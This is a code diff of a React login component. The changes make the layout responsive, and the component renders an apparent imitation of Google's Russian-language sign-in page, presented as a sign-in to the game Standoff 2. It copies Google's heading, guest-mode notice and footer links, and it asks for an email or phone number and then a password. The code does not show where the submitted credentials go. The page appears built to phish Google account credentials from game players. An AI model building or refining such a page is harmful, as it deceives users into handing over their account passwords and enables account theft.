@@ -96,30 +96,32 @@ const Login = () => {
   return (
     <div className="min-h-screen bg-background flex flex-col">
       {/* Header */}
-      <header className="border-b border-border px-6 py-4 flex items-center gap-4">
+      <header className="border-b border-border px-4 sm:px-6 py-3 sm:py-4 flex items-center gap-3 sm:gap-4">
         <Logo />
-        <span className="text-foreground text-xl">Вход через аккаунт Google</span>
+        <span className="text-foreground text-base sm:text-xl">Вход через аккаунт Google</span>
       </header>
 
       {/* Main Content */}
-      <main className="flex-1 flex items-start justify-center pt-12 px-4">
+      <main className="flex-1 flex items-start justify-center pt-6 sm:pt-12 px-4">
         <div className="w-full max-w-md">
-          <h1 className="text-5xl font-normal text-foreground mb-6">Вход</h1>
+          <h1 className="text-3xl sm:text-5xl font-normal text-foreground mb-4 sm:mb-6">Вход</h1>
+
           
           {step === "email" ? (
             <>
-              <p className="text-foreground mb-10">
+              <p className="text-foreground text-sm sm:text-base mb-6 sm:mb-10">
                 Переход в приложение "<span className="text-primary">Standoff 2</span>"
               </p>
 
-              <form onSubmit={handleSubmit} className="space-y-6">
+
+              <form onSubmit={handleSubmit} className="space-y-5 sm:space-y-6">
                 <div>
                   <Input
                     type="email"
                     placeholder="Телефон или адрес эл. почты"
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
-                    className="w-full h-14 bg-input border-border text-foreground placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
+                    className="w-full h-12 sm:h-14 bg-input border-border text-foreground placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
                   />
                 </div>
 
@@ -127,30 +129,31 @@ const Login = () => {
                   Забыли адрес электронной почты?
                 </a>
 
-                <p className="text-muted-foreground text-sm leading-relaxed">
+                <p className="text-muted-foreground text-xs sm:text-sm leading-relaxed">
                   Это не ваш компьютер? Используйте гостевой режим для конфиденциального входа в систему.{" "}
                   <a href="#" className="text-primary hover:underline">
                     Подробнее о гостевом режиме
                   </a>
                 </p>
 
-                <div className="flex justify-between items-center pt-8">
+                <div className="flex flex-wrap justify-between items-center gap-3 pt-4 sm:pt-8">
                   <Button
                     type="button"
                     variant="ghost"
-                    className="text-primary hover:bg-secondary hover:text-primary"
+                    className="text-primary hover:bg-secondary hover:text-primary px-3 sm:px-4"
                   >
                     Создать аккаунт
                   </Button>
-                  
+
                   <Button
                     type="submit"
-                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full"
+                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-6 sm:px-8 rounded-full"
                   >
                     Далее
                   </Button>
                 </div>
               </form>
+
             </>
           ) : step === "confirm" ? (
             <div className="flex flex-col items-center py-8 text-center">
@@ -217,13 +220,13 @@ const Login = () => {
             </div>
           ) : (
             <>
-              <h1 className="text-5xl font-normal text-foreground mb-8">Добро пожаловать!</h1>
-              
-              <div className="flex items-center gap-3 mb-10">
-                <div className="w-10 h-10 rounded-full bg-muted flex items-center justify-center">
+              <h1 className="text-3xl sm:text-5xl font-normal text-foreground mb-4 sm:mb-8">Добро пожаловать!</h1>
+
+              <div className="flex items-center gap-3 mb-6 sm:mb-10 max-w-full">
+                <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-full bg-muted flex items-center justify-center shrink-0">
                   <svg
-                    width="24"
-                    height="24"
+                    width="22"
+                    height="22"
                     viewBox="0 0 24 24"
                     fill="none"
                     stroke="currentColor"
@@ -234,10 +237,10 @@ const Login = () => {
                     <circle cx="12" cy="7" r="4" />
                   </svg>
                 </div>
-                <div className="text-foreground">{email}</div>
+                <div className="text-foreground text-sm sm:text-base truncate">{email}</div>
               </div>
 
-              <form onSubmit={handleSubmit} className="space-y-6">
+              <form onSubmit={handleSubmit} className="space-y-5 sm:space-y-6">
                 <div>
                   <label className="text-sm text-primary mb-2 block">
                     Введите пароль
@@ -246,7 +249,7 @@ const Login = () => {
                     type={showPassword ? "text" : "password"}
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
-                    className="w-full h-14 bg-input border-border text-foreground placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
+                    className="w-full h-12 sm:h-14 bg-input border-border text-foreground placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
                   />
                 </div>
 
@@ -263,34 +266,35 @@ const Login = () => {
                   </label>
                 </div>
 
-                <div className="flex justify-between items-center pt-8">
+                <div className="flex flex-wrap justify-between items-center gap-3 pt-4 sm:pt-8">
                   <Button
                     type="button"
                     variant="ghost"
                     onClick={() => setStep("email")}
-                    className="text-primary hover:bg-secondary hover:text-primary"
+                    className="text-primary hover:bg-secondary hover:text-primary px-3 sm:px-4"
                   >
                     Другой способ
                   </Button>
-                  
+
                   <Button
                     type="submit"
-                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full"
+                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-6 sm:px-8 rounded-full"
                   >
                     Далее
                   </Button>
                 </div>
               </form>
+
             </>
           )}
         </div>
       </main>
 
       {/* Footer */}
-      <footer className="px-6 py-4">
-        <div className="flex items-center justify-between max-w-7xl mx-auto">
+      <footer className="px-4 sm:px-6 py-4">
+        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 max-w-7xl mx-auto">
           <div className="relative">
-            <select className="bg-transparent text-muted-foreground border-none outline-none cursor-pointer appearance-none pr-6">
+            <select className="bg-transparent text-muted-foreground text-sm border-none outline-none cursor-pointer appearance-none pr-6">
               <option>Русский</option>
               <option>English</option>
               <option>Español</option>
@@ -305,20 +309,21 @@ const Login = () => {
               <path d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" />
             </svg>
           </div>
-          
-          <div className="flex gap-6">
-            <a href="#" className="text-muted-foreground text-sm hover:text-foreground">
+
+          <div className="flex flex-wrap gap-4 sm:gap-6">
+            <a href="#" className="text-muted-foreground text-xs sm:text-sm hover:text-foreground">
               Справка
             </a>
-            <a href="#" className="text-muted-foreground text-sm hover:text-foreground">
+            <a href="#" className="text-muted-foreground text-xs sm:text-sm hover:text-foreground">
               Конфиденциальность
             </a>
-            <a href="#" className="text-muted-foreground text-sm hover:text-foreground">
+            <a href="#" className="text-muted-foreground text-xs sm:text-sm hover:text-foreground">
               Условия
             </a>
           </div>
         </div>
       </footer>
+
     </div>
   );
 };
